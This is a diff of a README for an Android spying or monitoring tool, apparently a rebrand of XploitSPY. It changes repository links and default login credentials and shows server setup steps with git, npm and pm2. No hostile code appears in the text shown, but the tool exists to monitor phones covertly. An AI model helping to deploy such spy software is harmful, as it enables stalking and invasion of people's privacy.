@@ -1,5 +1,5 @@
 <p align="center">
-<img src="https://github.com/vikashmobileclinic/AndroidSpyServer/raw/master/server/assets/webpublic/logo.png" height="60"><br>
+<img src="https://github.com/vikashmobileclinic/VMC_ANDRO_SPY/raw/master/server/assets/webpublic/logo.png" height="60"><br>
 A cloud based Android Spying or Monitoring Tool, powered by NodeJS
 </p>
 
@@ -26,7 +26,7 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
  - NodeJs 
  - A Server 
 
-## Installation on Heroku [Click Here](https://github.com/vikashmobileclinic/AndroidSpyServer/blob/herooku/README.md)
+## Installation on Heroku [Click Here](https://github.com/vikashmobileclinic/VMC_ANDRO_SPY/blob/herooku/README.md)
 
   Video Tutorial for Heroku [Click Here](https://youtu.be/IoJGFZWCPko)
 
@@ -50,16 +50,16 @@ A cloud based Android Spying or Monitoring Tool, powered by NodeJS
     - `sudo npm install pm2 -g`
 
 4. Clone this repository
-    - `git clone https://github.com/vikashmobileclinic/AndroidSpyServer.git`
+    - `git clone https://github.com/vikashmobileclinic/VMC_ANDRO_SPY.git`
 
 5. Now change to the server directory and run these commands
     - `npm install` <- install dependencies
     - `pm2 start index.js` <-- start the script
     - `pm2 startup` <- to run XploitSPY on startup
     
-6. Default Username : admin & Default Password : password
+6. Default Username : vikash & Default Password : vikash
 
-7. Change the Username & Password
+7. if want to Change the Username & Password
     1. Stop VikashSPY `pm2 stop index`
     2. Open `maindb.json` in a text editor
     3. under `admin` 
